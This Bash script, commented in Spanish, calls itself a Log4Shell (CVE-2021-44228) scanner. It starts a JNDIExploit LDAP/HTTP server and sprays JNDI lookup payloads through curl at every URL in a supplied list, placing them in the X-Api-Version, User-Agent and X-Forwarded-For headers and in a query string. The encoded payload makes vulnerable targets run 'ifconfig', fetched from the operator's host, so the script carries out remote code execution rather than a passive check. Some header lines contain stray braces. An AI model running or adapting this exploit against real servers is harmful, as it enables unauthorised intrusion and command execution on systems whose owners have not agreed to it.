#! /bin/bash

# *************************************************************************************************
# Log4Shell Scanner: Escáner para identificar vulnerabilidad log4j RCE CVE-2021-44228
# Autor: Julian David Delgado Piraquive - H4ggen
# ¡Hack your Mind!
# *************************************************************************************************

# Debes ingresar los siguientes parámetros:
#	1. Diccionario de URLs a escanear
#	2. Dirección IP del servidor LDAP-HTTP
#	EJEMPLO /Log4Shell_Scanner.sh <Diccionario_URL> <IP_Servidor>


trap ctrl_c INT #Función salir con Control+C

function ctrl_c(){
    tput cnorm
    echo -e "\n\n[!] Saliendo..."
    kill %
    exit 1
}

if [ -z "$1" ];then
	echo -e '\e[0;31mFALTAN DATOS!\e[0m Por favor indique el diccionario de URLs a escanear.'
	echo "EJEMPLO: ./Log4Shell_Scanner.sh <Diccionario_URL> <IP_Servidor_LDAP_HTTP>"

elif [ -z "$2" ];then
        echo -e '\e[0;31mFALTAN DATOS!\e[0m Por favor indique la ip del servidor LDAP-HTTP.'
        echo "EJEMPLO: ./Log4Shell_Scanner.sh <Diccionario_URL> <IP_Servidor_LDAP_HTTP>"


else
	echo -e '\e[1;34mEl diccionario de URLs seleccionado es:\e[0m' $1 
	echo -e '\e[1;34mEl servidor seleccionado es:\e[0m' $2
 	echo -e '\e[1;34mIniciando Servidor LDAP y HTTP:\e[0m'

	java -jar /root/ServerLDAP-HTTP-Exploit-Log4Shell/JNDIExploit-1.2-SNAPSHOT.jar -i $2 -p 8000 & 1> /dev/null
	sleep 5
	
	echo -e '\n\e[1;34mIniciando Análisis utilizando X-Api-Version, User-Agent, X-Forwarded-For y LDAP Payload:\e[0m'

payloadheader='${jndi:ldap://'$2':1389/Basic/Command/Base64/aWZjb25maWc=}'
payload='?foo=$\{jndi:ldap://'$2':1389/Basic/Command/Base64/aWZjb25maWc=\}'


while read line;do
	echo -e '\e[1;34mEscaneando\e[0m: '$line

	curl -s --max-time 5 $line -H 'X-Api-Version: '$payloadheader'' > /dev/null 
	
	curl -s --max-time 5 $line -H 'User-Agent: '$payloadheader}'' > /dev/null 
	
	curl -s --max-time 5 $line -H 'X-Forwarded-For: '$payloadheader}'' > /dev/null 
	
	curl -s --max-time 5 "$line$payload" > /dev/null 
	
	sleep 1
	
done < $1 
fi
kill %
exit
